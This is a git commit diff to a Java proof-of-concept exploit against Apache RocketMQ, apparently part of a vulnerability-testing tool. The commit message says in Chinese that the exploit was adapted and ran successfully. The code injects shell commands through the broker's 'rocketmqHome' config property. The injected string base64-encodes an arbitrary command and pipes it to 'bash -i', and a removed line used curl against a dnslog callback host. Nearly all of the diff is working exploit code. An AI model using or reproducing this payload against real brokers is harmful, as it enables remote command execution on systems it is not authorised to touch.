e691d53d9671c2e512602f33e10d279cae7bd039
yz <ht22664957@163.com>
2023-06-07 16:56:25 +0800

    对 poc 简单改造，本地执行成功

--- rocketMq/src/main/java/me/gv7/woodpecker/vuldb/PayloadGenerator.java
+++ rocketMq/src/main/java/me/gv7/woodpecker/vuldb/PayloadGenerator.java
@@ -8,12 +8,19 @@ import org.apache.rocketmq.remoting.exception.RemotingTimeoutException;
 import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;
 
 import java.io.UnsupportedEncodingException;
+import java.util.Base64;
 import java.util.Properties;
 
 public class PayloadGenerator {
-    public static void updateConfig(String url) throws MQClientException, RemotingConnectException, RemotingSendRequestException, RemotingTimeoutException, MQBrokerException, UnsupportedEncodingException, InterruptedException {
+
+    public String getCmd(String cmd){
+        String cmdBase = Base64.getEncoder().encodeToString(cmd.getBytes());
+        return "-c $@|sh . echo echo \"" + cmdBase + "\"|base64 -d|bash -i;";
+    }
+
+    public static void updateConfig(String url, String cmd) throws MQClientException, RemotingConnectException, RemotingSendRequestException, RemotingTimeoutException, MQBrokerException, UnsupportedEncodingException, InterruptedException {
         Properties properties = new Properties();
-        properties.setProperty("rocketmqHome","-c $@|sh . echo curl cxf2921.dnslog.cn;");
+        properties.setProperty("rocketmqHome", cmd);
         properties.setProperty("filterServerNums","1");
 
         DefaultMQAdminExt adminExt = new DefaultMQAdminExt();
@@ -30,6 +37,7 @@ public class PayloadGenerator {
 
     public static void main(String[] args) throws RemotingConnectException, RemotingSendRequestException, RemotingTimeoutException, MQBrokerException, UnsupportedEncodingException, InterruptedException, MQClientException {
         String url = "192.168.178.128:10911";
-        updateConfig(url);
+        PayloadGenerator payloadGenerator = new PayloadGenerator();
+        updateConfig(url, payloadGenerator.getCmd("touch /tmp/1111"));
     }
 }
